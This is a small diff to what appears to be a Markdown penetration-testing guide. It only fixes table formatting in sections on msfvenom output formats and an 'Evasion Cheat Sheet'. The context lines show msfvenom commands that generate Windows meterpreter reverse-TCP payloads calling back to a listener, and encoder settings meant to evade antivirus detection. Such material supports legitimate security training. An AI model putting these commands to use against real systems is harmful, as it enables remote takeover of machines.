@@ -1586,7 +1586,8 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f 
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f psh-reflection -o payload.ps1
 ```
 - 3. Use different output formats
-|Format	|Command	|=se Case|
+|Format	|Command	|use Case|
+|----|----|----|
 |EXE|	-f exe	|Windows executables|
 |PowerShell|	-f psh-reflection|	Run from PowerShell|
 |VBA	|-f vba	|Office macros|
@@ -1678,6 +1679,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -x 
 
 ## Evasion Cheat Sheet
 |Goal|	Command|
+|----|----|
 |List encoders|show encoders|
 |Use basic encoder	|set encoder x86/shikata_ga_nai|
 |Multiple iterations (msfconsole)	|set iterations 5|
